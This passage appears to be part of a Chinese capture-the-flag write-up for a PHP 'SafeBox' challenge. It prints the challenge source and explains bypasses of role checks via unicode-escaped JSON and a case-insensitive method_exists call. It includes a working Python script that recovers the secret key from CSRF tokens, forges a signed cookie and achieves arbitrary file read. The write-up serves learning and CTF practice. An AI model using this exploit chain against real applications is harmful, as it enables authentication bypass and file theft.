+        <span class="s2">"role"</span> <span class="o">=&gt;</span> <span class="s2">"guest"</span>
+    <span class="p">];</span>                                                                                  <span class="c1">//初始化role为guest</span>
+    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'userinfo'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'userinfo'</span><span class="p">])</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>   <span class="c1">//base64解码cookie userinfo</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$h1</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                                                       <span class="c1">//前32位为h1</span>
+    <span class="nv">$h2</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                                                          <span class="c1">//后32位为h2</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$h1</span> <span class="o">!==</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">"md5"</span><span class="p">,</span> <span class="nv">$h2</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]))</span> <span class="p">{</span>                        <span class="c1">//再次hamc_md5校验(1)</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//防止身份伪造</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">"user"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>               <span class="c1">//防止h2中出现"admin"和"user"(2)</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$s</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>                                                        <span class="c1">//json解码h2，并转换成数组</span>
+    <span class="nv">$s</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]);</span>                                                    <span class="c1">//$s['role']转为字符串(3)</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>                                                         <span class="c1">//再次进行身份对比</span>
+        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">],</span> <span class="nv">$s</span><span class="p">);</span>                     <span class="c1">//用h2中的role替换session中userinfo的role</span>
+    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">fd_show_source</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//包含config.php 其中可能有flag？</span>
+<span class="k">function</span> <span class="nf">fd_config</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="k">include_once</span> <span class="nx">__DIR__</span> <span class="o">.</span> <span class="s2">"/config.php"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">fd_error</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="s2">"Error: </span><span class="si">{</span><span class="nv">$msg</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">fg_safebox</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nx">_fd_init</span><span class="p">();</span>                                                                         <span class="c1">//初始化</span>
+    <span class="nv">$config</span> <span class="o">=</span> <span class="nx">fd_config</span><span class="p">();</span>
+    <span class="nv">$action</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'method'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>                          <span class="c1">//指定action</span>
+    <span class="nv">$role</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">][</span><span class="s1">'role'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"userinfo"</span><span class="p">][</span><span class="s1">'role'</span><span class="p">]</span> <span class="o">:</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$role</span><span class="p">,</span> <span class="p">[</span><span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>                                           <span class="c1">//判断是否具有权限(1)</span>
+        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">'Permission denied!!'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'role'</span><span class="p">][</span><span class="s1">'admin'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$role</span> <span class="o">!=</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>               <span class="c1">//判读行为权限(2)</span>
+        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">'Admin permission denied!!'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$box</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SafeBox</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>                                                  <span class="c1">//判断对象方法是否存在(3)</span>
+        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">([</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">]);</span>                                         <span class="c1">//调用相应方法(4)</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>首先在初始化_fd_init()中，要点分析如下：</p>
+<ol>
+<li>再次hamc_md5校验：这里的校验好说，毕竟<code>SECRET_KEY</code>已经知晓，带上个<code>h1</code>就好</li>
+<li>防止h2中出现”admin”和”user”：这里使用了strpos来查看字符串中是否存在身份伪造，而且使用<code>！==</code>很规范，从源码基本也没看出什么破绽</li>
+<li>$s[‘role’]转为字符串：strval会将数组类型变得没有意义，也就想不出办法绕过对”admin”身份的检验</li>
+</ol>
+<p>在fg_safebox()中第一关就是要判断其身份，要求其为”admin”或”user”。结合以上的分析，admin的两次检验我是绕不过去了我认了。所以就开始琢磨能不能使最终的<code>$role</code>为”user”,而strpos约束我们在$h2中不能出现”user”,要不然我们编码试试？哈哈，这里的<code>$s = json_decode($h2, true);</code>就是等着我们利用的，可以将”user”进行unicode编码成为<code>\u0075\u0073\u0065\u0072</code>,这样在strpos中就不会检验出来，而且经过json_decode最终还原成”user”。</p>
+<p>在(2)判读行为权限中，加入<span style="color: inherit;" class="MathJax_Preview"></span><span role="presentation" data-mathml="&lt;math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x5BF9;&lt;/mo&gt;&lt;/mrow&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x8C61;&lt;/mo&gt;&lt;/mrow&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x7684;&lt;/mo&gt;&lt;/mrow&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x65B9;&lt;/mo&gt;&lt;/mrow&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x6CD5;&lt;/mo&gt;&lt;/mrow&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x4E0D;&lt;/mo&gt;&lt;/mrow&gt;&lt;mrow class=&quot;MJX-TeXAtom-ORD&quot;&gt;&lt;mo&gt;&amp;#x5728;&lt;/mo&gt;&lt;/mrow&gt;&lt;/math&gt;" style="position: relative;" tabindex="0" id="MathJax-Element-1-Frame" class="MathJax"><nobr aria-hidden="true"><span style="width: 11.703em; display: inline-block;" role="math" id="MathJax-Span-1" class="math"><span style="display: inline-block; position: relative; width: 8.99em; height: 0px; font-size: 130%;"><span style="position: absolute; clip: rect(1.267em, 1008.99em, 2.556em, -1000em); top: -2.212em; left: 0em;"><span id="MathJax-Span-2" class="mrow"><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-3" class="mi">b</span><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-4" class="mi">o</span><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-5" class="mi">x</span><span id="MathJax-Span-6" class="texatom"><span id="MathJax-Span-7" class="mrow"><span id="MathJax-Span-8" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">对</span></span></span></span><span id="MathJax-Span-9" class="texatom"><span id="MathJax-Span-10" class="mrow"><span id="MathJax-Span-11" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">象</span></span></span></span><span id="MathJax-Span-12" class="texatom"><span id="MathJax-Span-13" class="mrow"><span id="MathJax-Span-14" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">的</span></span></span></span><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-15" class="mi">r</span><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-16" class="mi">e</span><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-17" class="mi">a</span><span style="font-family: MathJax_Math; font-style: italic;" id="MathJax-Span-18" class="mi">d<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span id="MathJax-Span-19" class="texatom"><span id="MathJax-Span-20" class="mrow"><span id="MathJax-Span-21" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">方</span></span></span></span><span id="MathJax-Span-22" class="texatom"><span id="MathJax-Span-23" class="mrow"><span id="MathJax-Span-24" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">法</span></span></span></span><span id="MathJax-Span-25" class="texatom"><span id="MathJax-Span-26" class="mrow"><span id="MathJax-Span-27" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">不</span></span></span></span><span id="MathJax-Span-28" class="texatom"><span id="MathJax-Span-29" class="mrow"><span id="MathJax-Span-30" class="mo"><span style="font-family: STIXGeneral,&quot;Arial Unicode MS&quot;,serif; font-size: 77%; font-style: normal; font-weight: normal;">在</span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.212em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.323em; border-left: 0px solid; width: 0px; height: 1.425em;"></span></span></nobr><span role="presentation" class="MJX_Assistive_MathML"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>b</mi><mi>o</mi><mi>x</mi><mrow class="MJX-TeXAtom-ORD"><mo>对</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo>象</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo>的</mo></mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>d</mi><mrow class="MJX-TeXAtom-ORD"><mo>方</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo>法</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo>不</mo></mrow><mrow class="MJX-TeXAtom-ORD"><mo>在</mo></mrow></math></span></span><script id="MathJax-Element-1" type="math/tex">box对象的read方法不在</script>config[‘role’][‘admin’]数组内，那么就不会判断<code>$role != "admin"</code>，进而产生绕过。我们再修改一下原先的代码（new-2.py）如下：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56</pre></div></td><td class="code"><div class="codehilite"><pre><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"</span>
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">str_list</span> <span class="o">=</span> <span class="s">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+<span class="n">re_csrf_token</span> <span class="o">=</span> <span class="s">r'(?&lt;=value=").*?(?=")'</span>
+<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s">'X-Requested-With'</span><span class="p">:</span> <span class="s">'XMLHttpRequest'</span><span class="p">}</span>
+<span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">method</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)):</span>
+        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
+                <span class="n">d</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+                <span class="k">break</span>
+    <span class="k">return</span> <span class="n">d</span>
+
+<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">31</span><span class="o">+</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mi">62</span><span class="o">-</span><span class="n">d</span><span class="p">[</span><span class="mi">28</span><span class="o">+</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">62</span>
+        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">create_cookie</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
+    <span class="n">h2</span> <span class="o">=</span> <span class="s">r'{"role":"\u0075\u0073\u0065\u0072"}'</span>
+    <span class="n">h1</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">h2</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s">'userinfo'</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">h1</span><span class="o">+</span><span class="n">h2</span><span class="p">)}</span>
+
+<span class="n">r0</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">token0</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r0</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">d0</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
+<span class="n">payload0</span> <span class="o">=</span> <span class="p">{</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'go'</span><span class="p">,</span> <span class="s">'CSRF_TOKEN'</span><span class="p">:</span><span class="n">token0</span><span class="p">,</span> <span class="s">'act'</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">'key'</span><span class="p">:</span><span class="s">'1234567'</span><span class="p">}</span>
+<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload0</span><span class="p">)</span>
+<span class="n">r1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">token1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">d1</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
+<span class="n">pre</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">d0</span><span class="o">+</span><span class="n">d1</span>
+<span class="n">secret</span><span class="p">,</span><span class="n">key</span> <span class="o">=</span> <span class="n">guess</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">str_list</span><span class="p">,</span><span class="n">action</span><span class="p">)</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="n">create_cookie</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">'submit'</span><span class="p">:</span><span class="s">'go'</span><span class="p">,</span> <span class="s">'CSRF_TOKEN'</span><span class="p">:</span><span class="n">token1</span><span class="p">,</span> <span class="s">'act'</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">'method'</span><span class="p">:</span><span class="n">method</span><span class="p">,</span> <span class="s">'key'</span><span class="p">:</span><span class="n">key</span><span class="p">}</span>
+<span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="s">'Permission deny!!'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[+]Done!'</span>
+    <span class="k">print</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>相应的get-2.py也简单如下：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11</pre></div></td><td class="code"><div class="codehilite"><pre><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#coding=utf-8</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">'python'</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
+    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">output</span>
+        <span class="k">break</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>输出如下：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="codehilite"><pre><span class="nv">$ </span>python get-2.py new-2.py fg_safebox <span class="nb">read</span>
+<span class="o">[</span>+<span class="o">]</span>Done!
+<span class="s2">"Error: Admin permission denied!!"</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>在简单尝试之后”user”只能调用$box对象的view、alist和view方法，唯独不能使用read方法，如果说一定要用read方法，
+这里估计也是无法绕过去了。不急，继续往下看看有没有思路，在(4)调用相应方法中，其会和PHP对象有关联，而就我知道的和搜索到的，大多都是PHP对
+象注入问题，而这里也没有魔术方法和序列化之类的东西，猜测也就不是这个考察点。那么关注的重心就移到了(3)判断对象方法是否存在，在使用
+method_exists的时候会不会出现什么问题呢，看<a href="https://github.com/php/php-src/blob/f8faffe37edd74e0314f74436825bfcf5be78a49/Zend/zend_builtin_functions.c">源码</a>之：</p>
+<p><img alt="" src="Larry_files/5.png"></p>
+<p>唉呀妈呀，其中一句<code>lcname = zend_string_tolower(method_name);</code>，就猜测这里是先将方法名转成小写再进行判断和利用的。我们这里就可以大小写绕过，使”user”调用的方法为<code>READ</code>，进入(4)中的函数调用，加上filename的POST就可以进行任意文件读取啦～</p>
+<h1 id="0x03"><a name="user-content-0x03" href="#0x03" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>0x03 寻找</h1>
+<hr>
+<p>赶紧读读config.php里面有没有什么东西，结果：</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2</pre></div></td><td class="code"><div class="codehilite"><pre><span class="o">[</span>+<span class="o">]</span>Done!
+<span class="o">[</span><span class="s2">"&lt;?php\n"</span>,<span class="s2">"\/**\n"</span>,<span class="s2">" * Created by PhpStorm.\n"</span>,<span class="s2">" * User: phithon\n"</span>,<span class="s2">" * Date: 16\/6\/8\n"</span>,<span class="s2">" * Time: \u4e0a\u534812:24\n"</span>,<span class="s2">" *\/\n"</span>,<span class="s2">"\n"</span>,<span class="s2">"return [\n"</span>,<span class="s2">"    \"role\" =&gt; [\n"</span>,<span class="s2">"        \"admin\" =&gt; [\n"</span>,<span class="s2">"            \"read\"\n"</span>,<span class="s2">"        ],\n"</span>,<span class="s2">"        \"user\" =&gt; [\n"</span>,<span class="s2">"            \"view\", \"alist\", \"random\"\n"</span>,<span class="s2">"        ]\n"</span>,<span class="s2">"    ]\n"</span>,<span class="s2">"];"</span><span class="o">]</span>
+</pre></div>
+</td></tr></tbody></table>
+
+<p>看来还是要有点渗透思维去读读配置文件什么的，看看flag到底藏在哪，参考<a href="https://www.91ri.org/7911.html">Linux渗透与提权：技巧总结篇</a>与<a href="https://www.91ri.org/7459.html">Linux提权后获取敏感信息的方法与途径</a>，把里面cat的文件全部集中一起，写个脚本跑一遍及可发现flag，代码与之前的类似，详见<a href="https://github.com/Larryxi/My_tools/tree/master/puzzle2016">github</a></p></article><div style="position: absolute; width: 0px; height: 0px; overflow: hidden; padding: 0px; border: 0px none; margin: 0px;"><div style="position: absolute; visibility: hidden; top: 0px; left: 0px; width: auto; padding: 0px; border: 0px none; margin: 0px; white-space: nowrap; text-align: left; text-indent: 0px; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; font-size: 40px; font-weight: normal; font-style: normal; font-size-adjust: none; font-family: MathJax_AMS,monospace;" id="MathJax_Font_Test"></div></div></body></html>
